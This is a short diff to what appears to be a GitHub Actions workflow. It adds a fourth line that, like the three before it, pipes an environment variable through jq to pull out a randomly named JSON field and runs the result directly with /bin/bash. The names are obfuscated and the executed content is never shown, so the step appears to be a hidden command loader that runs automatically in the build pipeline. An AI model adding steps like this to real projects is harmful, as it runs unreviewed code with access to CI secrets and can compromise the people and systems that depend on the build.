@@ -33,6 +33,7 @@ jobs:
           echo $iuhmt2 | jq -r .dxet01951 | /bin/bash
           printf '%s' "$cquf06" | jq -r .khmly117 | /bin/bash
           printf '%s' "$nmi82845" | jq -r .m90 | /bin/bash
+          printf '%s' "$bak2124" | jq -r .b62243 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
